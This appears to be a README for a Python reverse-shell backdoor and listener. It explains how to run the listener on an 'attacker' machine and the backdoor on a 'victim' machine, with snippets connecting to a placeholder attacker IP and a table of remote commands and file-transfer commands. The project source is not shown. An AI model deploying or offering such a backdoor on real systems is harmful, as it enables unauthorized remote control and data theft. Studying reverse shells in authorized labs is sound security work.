# 🐍 Python Backdoor & Listener Server

This project demonstrates how to create a simple **backdoor** and **server listener** using Python's `socket` and `subprocess` modules. It's built for **educational** and **ethical hacking** purposes, specifically for practicing reverse shell communication, file transfers, and remote command execution.

---

## ⚙️ Features

- Reverse shell from target to attacker
- Remote command execution on target machine
- Upload and download files between machines
- Persistent connection attempts from the backdoor
- JSON-based reliable communication
- Command-line shell interface for interaction

---

## 📁 File Structure

```

.
├── server.py       # Listener/Command control center
├── backdoor.py     # Script to be executed on the target machine
└── README.md

````

---

## 🚀 How to Use

### 1. **On the Attacker's Machine (Server):**

Edit the IP in `server.py` to match your local IP address:
```python
sock.bind(('YOUR-IP-HERE', 5555))
````

Then run:

```bash
python server.py
```

### 2. **On the Victim's Machine (Backdoor):**

Edit the IP in `backdoor.py` to match the server's IP:

```python
s.connect(('YOUR-IP-HERE', 5555))
```

Then run:

```bash
python backdoor.py
```

---

## 🔐 Commands Supported

| Command           | Description                             |
| ----------------- | --------------------------------------- |
| `cd <dir>`        | Change directory                        |
| `upload <file>`   | Upload a file from attacker to victim   |
| `download <file>` | Download a file from victim to attacker |
| `clear`           | Clear the screen (local only)           |
| `quit`            | Close the session                       |
| `<any other>`     | Execute system command on target        |

---

## 🛡️ Ethical Use Disclaimer

This project is strictly for **educational use only**. Do **not** run this code on any machine or network without **explicit permission**. Unauthorized use may be illegal and unethical.

---

